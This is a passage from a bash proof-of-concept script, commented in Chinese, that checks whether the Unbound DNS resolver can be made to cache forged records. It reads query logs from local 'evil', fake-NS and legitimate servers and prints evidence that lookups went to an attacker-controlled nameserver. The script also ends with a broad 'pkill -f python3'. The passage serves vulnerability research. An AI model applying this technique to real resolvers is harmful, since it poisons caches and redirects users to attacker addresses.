echo "  Evil (127.0.0.3) 查询日志:"
cat "$VDIR/evil.jsonl" 2>/dev/null | python3 -c "
import sys, json
for l in sys.stdin:
    if l.strip():
        q = json.loads(l)
        print(f'    {q[\"q\"]:<30} {q[\"t\"]:<8}')" 2>/dev/null || true

echo ""
echo "  合法权威 (127.0.0.4) 查询日志:"
cat "$VDIR/legit.jsonl" 2>/dev/null | python3 -c "
import sys, json
count = 0
for l in sys.stdin:
    if l.strip():
        count += 1
        q = json.loads(l)
        print(f'    {q[\"q\"]:<30} {q[\"t\"]:<8}  from={q[\"f\"]}')
if count == 0:
    print('    ★ 无查询 — Unbound 完全绕过了合法权威服务器！')" 2>/dev/null || true

echo ""
echo "  Fake NS (127.0.0.1) 查询日志:"
cat "$VDIR/fake.jsonl" 2>/dev/null | python3 -c "
import sys, json
for l in sys.stdin:
    if l.strip():
        q = json.loads(l)
        print(f'    {q[\"q\"]:<30} {q[\"t\"]:<8}  from={q[\"f\"]}')" 2>/dev/null || true

echo ""
echo "  Unbound 关键日志:"
grep -iE "cname|victim|evil|resolve|ns\.victim|target|sending to" "$VDIR/unbound.log" 2>/dev/null | head -50 || true

# ══════════════════════════════════════════════════════════════════
# 判定
# ══════════════════════════════════════════════════════════════════
echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║  判定结果                                                       ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""
echo "  1. 合法权威 (127.0.0.4) 返回: www.victim.com A 1.2.3.4"
echo "  2. Fake NS   (127.0.0.1) 返回: www.victim.com A 6.6.6.6"
echo "  3. Unbound 实际返回:           www.victim.com A ???"
echo ""

if [ "$FAKE_N" -gt 0 ] 2>/dev/null; then
    echo "  ╔════════════════════════════════════════════════════════════════╗"
    echo "  ║  ★ 信任边界突破已证明                                       ║"
    echo "  ║                                                              ║"
    echo "  ║  Unbound 因跟踪 NS→CNAME 跨域解析，将查询发送到             ║"
    echo "  ║  攻击者控制的 Fake NS (127.0.0.1)，而非合法权威              ║"
    echo "  ║  (127.0.0.4)。Fake NS 返回的伪造权威数据被 Unbound          ║"
    echo "  ║  接受并缓存，导致受害域的解析结果被篡改。                    ║"
    echo "  ║                                                              ║"
    echo "  ║  证据链:                                                     ║"
    echo "  ║  • Fake NS 收到 $FAKE_N 个查询 (Unbound 信任了 CNAME 解析的地址)  ║"
    echo "  ║  • 合法权威 收到 $LEGIT_N 个查询 (Unbound 绕过了合法权威)     ║"
    echo "  ║  • 客户端收到伪造 IP 而非合法 IP                             ║"
    echo "  ╚════════════════════════════════════════════════════════════════╝"
else
    echo "  ╔════════════════════════════════════════════════════════════════╗"
    echo "  ║  PoC 执行中，等待更多证据...                                  ║"
    echo "  ╚════════════════════════════════════════════════════════════════╝"
fi

# 清理
pkill -f python3 2>/dev/null || true
pkill -f "unbound.*5353" 2>/dev/null || true
echo ""
echo "=== Complete ==="
